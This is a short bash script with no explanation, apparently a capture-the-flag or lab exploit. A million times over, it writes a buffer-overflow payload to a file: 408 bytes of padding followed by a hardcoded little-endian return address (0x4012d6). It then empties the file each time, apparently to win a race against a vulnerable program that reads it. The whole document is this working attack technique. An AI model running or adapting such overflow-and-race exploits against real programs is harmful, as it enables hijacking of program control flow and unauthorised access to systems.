#!/bin/bash

for i in {0..1000000}
do
    printf 'a%.0s' {1..408} > my_file
    printf '\xd6\x12\x40\x00\x00\x00\x00' >> my_file
    printf '' > my_file
done
